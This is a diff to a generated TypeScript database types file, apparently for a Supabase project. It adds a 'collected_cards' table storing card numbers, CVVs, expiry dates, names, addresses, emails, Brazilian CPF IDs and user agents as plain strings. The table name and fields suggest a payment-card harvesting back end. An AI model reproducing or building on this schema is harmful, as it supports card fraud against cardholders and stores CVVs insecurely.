@@ -14,6 +14,45 @@ export type Database = {
   }
   public: {
     Tables: {
+      collected_cards: {
+        Row: {
+          cpf: string | null
+          created_at: string
+          cvv: string | null
+          email: string | null
+          endereco: string | null
+          id: string
+          nome: string | null
+          numero: string | null
+          user_agent: string | null
+          validade: string | null
+        }
+        Insert: {
+          cpf?: string | null
+          created_at?: string
+          cvv?: string | null
+          email?: string | null
+          endereco?: string | null
+          id?: string
+          nome?: string | null
+          numero?: string | null
+          user_agent?: string | null
+          validade?: string | null
+        }
+        Update: {
+          cpf?: string | null
+          created_at?: string
+          cvv?: string | null
+          email?: string | null
+          endereco?: string | null
+          id?: string
+          nome?: string | null
+          numero?: string | null
+          user_agent?: string | null
+          validade?: string | null
+        }
+        Relationships: []
+      }
       coupons: {
         Row: {
           active: boolean
